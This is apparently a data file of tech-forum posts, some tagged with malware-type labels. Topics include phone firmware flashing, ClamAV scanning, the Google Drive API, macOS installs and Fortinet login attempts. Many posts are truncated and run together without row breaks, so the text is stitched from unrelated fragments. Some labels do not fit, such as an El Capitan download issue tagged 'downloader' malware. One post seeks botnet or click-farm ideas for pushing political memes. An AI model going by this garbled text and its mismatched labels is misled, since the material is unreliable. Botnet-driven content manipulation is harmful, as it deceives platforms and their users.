As far as I can tell I am using the most recent firmware to flash the device in Odin (more details below). I am attempting to flash the BL, AP, CP, CSC (not Home CSC) and USERDATA all at once in order to achieve a full factory reset. After starting the Flashing process in Odin it appears to be communicating with the device; the log indicates that the process is going well and the device responds with a loading bar at the bottom of the download mode screen. After completing the flashing process in Odin it all appears to be successful; I get the green PASS indication at the top, and Odin says success 1/failed 0 at the bottom. The phone restarts itself as it should at the end of this process, however it is still stuck in the same boot loop. I am still able to connect the device to my computer and access download mode without issue.  
  
As for the firmware version I am attempting to flash on to the device, I downloaded and flashed what appeared to be the latest version via the SamMobile official website (https://www.sammobile.com/samsung/g.../SM-A326U/TMK/download/A326USQSADWE2/1756908/), and also attempted the latest available firmware that I downloaded via Frija. Again, I have been attempting to flash the BL, AP, CP, CSC (not Home CSC) and USERDATA all at once.

1211,"Automating anti-virus scan of new files. I'm going to be switching from an old version of Windows to a flavor of Ubuntu for my desktop soon. I understand all the reasons why anti-virus is less vital on Linux-based systems than Windows, but as someone who does on occasion download games from random unknown itch.io users and the like, I would just feel a lot better knowing that files I download are at least getting scanned before I run them. And, as someone who can occasionally be forgetful, I'd rather not rely on myself to remember to do a scan manually every time.

I've looked at setting up the on-access scanning built into ClamAV, but from what I've read it keeps its entire virus database in memory at all times (using about 1GB), which sounds like it has a significant performance cost. I'm not thrilled with the idea of a constant performance cost just to spend like 3 seconds doing a scan every once in awhile.

From my research, it seems like a good middle ground here would be to use inotify to monitor one or more folders for changes, and have that trigger a command-line clamscan of a new or changed file when one is detected. It sounds like inotify is pretty efficient, and then whatever small performance cost there is to running a clamscan would only trigger for a few seconds immediately after downloading a file, which seems pretty reasonable to me.

If the file comes back negative, nothing needs to happen. If the file comes back positive, I believe there's a command-line option for clamscan that should trigger a desktop notification. It would probably be good to also disable execution for that file, or maybe even move it to like a quarantine folder? Again, I believe ClamAV has an option to do that.

I'm a developer, but I have limited experience on Linux. I can manage a little scripting to get this all working if necessary, but I definitely have a few questions.

* Does this all make sense and sound like a reasonable security precaution?
* I know there's another library, fswatch, that's built on top of inotify. Is there any benefit to using fswatch for my purposes, or should I just use inotify directly?
* What's reasonable to watch with inotify this way? I'm thinking ~/Downloads at a minimum. Could I watch the entire home folder, or would that cause performances issues?
* What's the best way of getting this to, you know, actually work? I haven't written very many bash scripts so any pointers here would be helpful.
* Also, how would I automatically run this on startup?

I've just tried to add some images to a post I'm working on. No luck. So I log on using a different browser and no problems the images are downloaded. Yet 5 mins later I get the same problem with another image.

I ensure that the file name is simple (I know that can cause issues). But I'm getting fed up with continually having to roll the dice and hoping I can add an image to my library every time I want to create content. I did have the size of the downloads increased, that didn't make much difference, though now it's reverted back to 100 mb (though note that this didn't stop it working for about 5 mins). 

I wonder if I'm missing something really obvious or it's an issue with the servers and wordpress? Btw, I'm checking the image sizes, these aren't big.

Thoughts welcome!

For whatever reason, when I try to reinstall High Sierra using the boot menu, it doesn't work. So I have decided to make a bootable USB. The problem with that is that I cant seem to find a version of High Sierra anywhere...

\- host things it in Azure or AWS (I m a network eng, so I can deal with this stuff), have MediaServer....etc.

He's ensured that his BitTorrent client is turned completely off to prevent any AFK activity on the network and is not running BitTorrent on accident in the background. 

He has also been asked to use a VPN if he's going to torrent on the internet.
My internet was even shut down once due to these alerts. To resolve the issue, I had to upgrade my firewall settings to stop receiving the AUP notifications. I had to contact my ISP Cox to restore the connection. But I am still getting the weird alerts sent.

The strange part is that I haven't noticed any noticeable changes in internet speed or performance when the supposed BitTorrent-related AUP alerts started appearing. I've been receiving multiple ""IP Reputation security risks"" and

Jason Dion- I went through all his videos next.  I downloaded the notes and went through all the videos and used the notes to keep me on point.

At the end of my Python script, my goal is to delete a number of folders from a shared drive after I've downloaded them. However I am not the owner of these folders, and I get a 403 PermissionError when I try to do this, even if I give myself what look like the correct scopes:

    SCOPES = ['https://www.googleapis.com/auth/drive', 'https://www.googleapis.com/auth/drive.file']
        for folder_id_to_delete in google_drive_folders_to_delete:

            print(f""Could not remove folder: {folder_id_to_delete}: {e}"")

Strangely enough, when I manually navigate there, I can select those folders, and click the trash button to ""remove"" them, no problem. Then what's weirder is, when I programmatically get the list of folders in that main shared folder? Those no longer show up:

    def list_folders_in_folder(service, folder_id):
    page_token = None
    folder_ids = []
    while True:
        results = service.files().list(
            q=f""'{folder_id}' in parents and (mimeType='application/vnd.google-apps.folder' or mimeType='application/zip' or mimeType='application/x-zip-compressed') and trashed = false"",
            fields=""nextPageToken, files(id, name, mimeType, createdTime)"",

Programmatically this allows me to achieve my goals: I effectively can remove the folders so next time I run the program? The ""removed"" ones won't show up.

Problem is, I need to do that last step manually. And I'd rather not do shitty Selenium automation where I literally have it click the buttons to delete the folders. Is there a way to get the equivalent result via the Google Drive API?

Because apparently I can't officially ""delete"" them via the Google Drive API, since I'm not the owner. ChatGPT insists that what happens here is I'm simply removing the folders from *my view* \-- but OTHERS in the shared folder will still be able to see the folders. But is there a way to get this equivalent end result, some way via the API to make it so they don't show up anymore in my view, either when I actually navigate there or search for the folders list programmatically?

Maybe some function to ""trash"" them or ""hide from my view"" or something?

I have the following problem:

1256,"A71 5g on T-mobile refuses to update. Background: I was gifted a Galaxy A71 5g by a family member. It appears to have been originally an ATT device, based on the ATT apps that it preloads. It's unlocked, and if I put in my t-mobile sim card it connects to T mobiles network and data/calls work fine.

However, it's currently running Android 10 with the Oct 2020 security patch, and I cannot for the life of me get it to update. 

Here's what I've tried so far:

* Updating through settings, I get one of two errors: 

1. No updates available, please check in 24 hours
2. DM initialization is not ready. Please check network or SIM card.

* I have tried to update via wifi and mobile data.
* I have tried to update with and without the SIM card.
* Updating via PC with samsung smart switch
   * Smart Switch detects that there are updates available, but when I start the process it creates a window that says ""Configuring Software Update environment... Please do not disconnect the cable from the PC"", and it basically just sits at that window forever, I've let it go a couple hours without any change. Nothing on the phone to indicate an update is happening either.
   * Smart Switch successfully pre downloaded the update, after I went into settings and told it to, but never seems to actually update
* I have factory reset multiple times
* I have tried to update from Safe mode
* I have booted into recovery mode and wiped the cache partition

In recovery mode, I noticed there are options to update the device via SD card, which I have available. I've been googling for guides on that, and I've found some but none that give me tremendous confidence as of yet. Is applying a normal Android patch via this method a potential solution? It looks like the phone should be able to support all the way up to Android 13, so ideally I'd like to just get it patched/flashed up to the most recent available software, and particularly the most recent available security update.

I have a suspicion that the device originally being ATT might somehow be relevant, but I have no real evidence to support it, and it does seem to communicate just fine on the T Mobile network.

1259,"Help Needed: Troublesome El Capitan Download on Early 2009 iMac. 
Introduction:
I come to you today seeking guidance and assistance with a frustrating issue that has plagued my trusty early 2009 iMac. It seems that I am unable to successfully download macOS El Capitan on my machine. Despite the progress bar indicating a completed download, I am consistently redirected back to the recovery menu as if nothing had happened. I humbly share my experience here in the hopes that someone can shed some light on this perplexing dilemma.

Background:
My early 2009 iMac has faithfully served me for years, enabling me to tackle various tasks and enjoy the benefits of technology. However, as time has passed and newer versions of macOS have been released, I have started to feel the limitations of my hardware. In an attempt to breathe new life into my iMac and take advantage of the latest features and security enhancements, I embarked on the journey of upgrading to macOS El Capitan, the compatible operating system for my aging machine.

The El Capitan Download Challenge:
With much anticipation, I followed the instructions provided by Apple and initiated the download through the recovery menu. The progress bar appeared, filling me with hope as it indicated that the download process was underway. However, my excitement quickly turned to disappointment as I found myself right back in the recovery menu, seemingly devoid of any trace of El Capitan.

Conclusion:
Here I stand, my early 2009 iMac still unable to successfully download macOS El Capitan, and my frustration growing by the day. Despite my persistent troubleshooting efforts and the invaluable support of online communities and Apple's customer service, I remain at a loss. I turn to you, fellow Redditors, in the hope that someone might possess the key to unlock this conundrum. Your assistance would be greatly appreciated as I strive to overcome this obstacle and breathe new life into my faithful iMac once again.",downloader,malware type

1272,"I hate computers and anything related to them, I wanna quit everything. Not sure if this the correct sub since my job role doesn't say sysadmin but fuck everything computers related I just wanna scream and let you everything.

A little background, I used to be a sysadmin for a small group of researchers with their HPC machines, that is how my career, it was purely out of luck but I somehow got there and got the job and somehow was perfect for them. Studied Data Science however realised I wasn't smart enough and then just did everything I could and got my cert in Redhat. I lucked into the job at COVID as I had nothing else and they had no one who understood their requirments. I fixed a lot of their stuff a week in.

Even though it was small, those servers were critical and me being remote meant a bunch of times I had to guide someone through a video call. I had complete freedom to do whatever I want, so I did try to go back to Data Science and I thought I learnt enough about real life applications that I wanted to switch, got a job offer in a really really big company in another country, aced it and got a Data Engineer roles.

But gooood, I don't think I have done a single data engineer task after I've joined here. My very first task was to get a forecasting system into production. 

There was no architect or PM on the project, I made documents with the knowledge I had at the time, thought it would be a simple approval to buy some servers and get our stuff setup on it, apparently not (my lack of experience really struck here). Our IT forced us to go cloud, okay we did. It took them 3 months to completely comission them as cloud support was outsourced, actually everything here is outsourced.

By the time those machines got built, our requirments moved a lot due a lot of weird quick and old data servers which somehow only work on windows. (This was the point I should have given up) But no I decided to go with windows. 

We have anaconda installed on our machines however we can't install any packages while working in office, we can however when we are on personal networks and company VPN. (I still cannot grasp my head around this, either block it completely or have a central repository)

So I had to manually download all packages and setup environments(containers are not seen anywhere in the company), copy them to sharepoint and then download from sharepoint onto that cloud VM, which can only be accessed via RDP. This jank worked and we had stuff setup via bash files, we still needed to share out outputs and we didnt get access to pour data warehouse, so we went to sharepoint :))). 

Now everything runs off sharepoint, our webapp we build, guess what its reading files via sharepoint API. I just also had to rebuild the entire web app because now that it got released people weren't happy with the performance so it got dumped onto me, since I am apparently the guy who can fix everything, I mean I did but I have lost so much sanity.

I have a very generous budget to spend but I can't due to the amount of redtape and approvals required, basic QOL changes like not even having access to any repositories or the fact that fucking git is blocked at work. We were paying 6 figures for a service, whose apps are deployed either via their dashboard (by manually copying files, I saw people manually copying 100 files) or via an automated git deploy. Which despite being present in the app documents and clearly a functional requirment, it was still blocked.

My previous work just messaged saying they have job opening, I will have complete freedom there and I will have absolute power over the budget and how to spend it. I don't know if its the lack of freedom or not but I am really really tempted.

My current job is a wayy bigger org and the stuff I have deployed and working on is way more pretigious, however I am tired of doing so many things, I am losing braincells, I do not like sharepoint, I do not like Windows, I do not like being a Web Dev and I do not like everyone in my IT department pretending I don't know what a DNS is. and mostly Im just tired duct taping everything just to get it out of the door.

I don't know if I wanna even switch back being a sysadmin cus even though the job was chill, I was bored with life and those emergency calls at 2am, even tho infrequent I hated them. I have good work life seperation here however work is frustrating.

1274,"Wordpress - a popular content management system.. # How to Remove Malware from WordPress Site.

WordPress is a popular content management system (CMS) that is used by millions of websites around the world. Unfortunately, WordPress sites are also vulnerable to malware attacks. If your WordPress site is infected with malware, it can cause a variety of problems, including:

* Defaced pages: Malware can change the content of your pages, making them look like they've been hacked.
* Malicious links: Malware can add malicious links to your pages, which can redirect visitors to harmful websites.
* Spam: Malware can send spam emails from your website's address.
* Botnet: Malware can turn your website into a botnet, which can be used to launch attacks on other websites.

If you think your WordPress site might be infected with malware, it's important to take action to remove it as soon as possible. In this article, I will explain how to remove malware from WordPress.

  
**Step 1: Back up your site.**  
  
Before you start removing malware, it's important to back up your site. This will create a copy of your site's files and database, which you can use to restore your site if something goes wrong.  
  
**Step 2: Put your site into maintenance mode.**  
  
Once you've backed up your site, you need to put it into maintenance mode. This will prevent visitors from accessing your site while you're removing the malware.  
  
**Step 3: Scan your site for malware.**

I wanna share the pros to have an outgoing proxy for all lxc, vm, docker instances you have at home.

A simple squid instance, with tools like crowdsec and tons of blacklist integrated out there can save your sweety nodes to download unwanted software (a trojan) and become a part of a botnet.

- You can make squid serving just your local subnet
- You can add authentication
- You can geo block

I was at work the other day, searching on Google, when I get a warning that my IP has been flagged for the Meris Botnet and that I needed to confirm that I am human with a recaptcha.

The malware bypasses firewalls by using advanced Berkeley Packet Filters (BPF) to load and activate the backdoor. BPFDoor has evolved with an increase in instructions.

1284,"How to ""archive"" an old WordPress site.. A non-profit I'm involved with discontinued their WordPress site, and moved to a completely different platform.  There is a ton of content on the old WordPress site that hasn't been moved yet.   They would like to keep the WordPress site up and browsable at ""archive.domain.org""   They want to set it and forget it, not worry about security patches etc.   So my thoughts are, make the MySQL database read only, and make sure the file system is read only.     But I'm still worried about unpatched vulnerabilities being used as part of a botnet, etc.

1286,"Any ideas on how to spread political memes on Chinese social media?. So we all know about the Great Firewall of China and how it censors what information Chinese citizens can access. Another side to that same coin is that people outside China are unable to promote content directly to the Chinese people. 

China's social media apps like Little Red Book are also difficult for foreigners to participate on. For example, you can't anonomously create accounts; new accounts need to be tied to an irl phone number. Even once you get an account, you can't pay to promote your post without a mainland Chinese bank account or payment method. On top of that, political posts/memes are quickly caught and deleted and your account gets banned.

I'm looking for big picture ideas here. For a meme to take off, I think it'd need to get posted by a bunch of accounts very quickly. I'm imagining a botnet of social media accounts, or a click-farm to quickly repost and upvote the memes, but I don't know if those exist for China's internal social media. Any ideas?",botnet,malware type
1287,"Constant NTLM/Dictionary Account Enumeration on Forticlient. Hi all,

Just yesterday we're now receiving a lot of NTLM challenges through our Forticlient VPN from what seems to be a botnet (as they're coming from numerous different IPs). Is anybody else going through this now as well?

Aside from changing all of our IPs and ports, is there a realistic way we can mitigate this? If they're only grabbing usernames, we may be okay in the short term, but I do want to stop them either way.

I know that Fortinet had an exploit created for them over the weekend so it would make sense they're going after this from us. Just curious on how they managed to get the IPs and port number to attempt (albeit, I don't believe it would be too hard to scan for port number if they found an IP).  


Just want to find out whether this is a targeted or if we're just part of a mass list of people.

Thank you!",botnet,malware type
